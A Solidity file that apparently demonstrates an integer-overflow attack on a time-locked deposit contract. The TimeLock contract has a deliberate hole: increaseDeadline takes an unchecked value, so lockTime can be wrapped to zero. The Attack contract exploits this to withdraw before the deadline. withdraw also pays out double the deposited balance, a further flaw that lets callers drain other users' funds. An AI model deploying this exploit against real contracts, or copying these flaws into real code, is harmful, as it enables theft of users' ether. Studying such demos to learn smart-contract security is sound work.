//SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLock{
    mapping (address => uint256 )public balances;
    mapping (address => uint256)public lockTime;

    function deposit()public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 30 days;
    }
   
    function withdraw()public {
        require(balances[msg.sender]>0,"Insufficient balance");
        require(block.timestamp > lockTime[msg.sender],"Dead line not expired yet!");

        uint256 amount = 2 * balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,)=msg.sender.call{value : amount}("");
        require(sent, "Failed to transfer Ether");
    }
    function increaseDeadline(uint256 _secondToIncrease)public {
        lockTime[msg.sender] += _secondToIncrease;
    }
}
contract Attack{
    TimeLock timeLock;
    constructor(TimeLock _timeLock){
        timeLock = TimeLock(_timeLock);
    }
    fallback() external payable { }

    function attack()public payable {
        timeLock.deposit{value : msg.value}();
        timeLock.increaseDeadline(type(uint256).max + 1 - timeLock.lockTime(address(this)));
        timeLock.withdraw();
    }
}
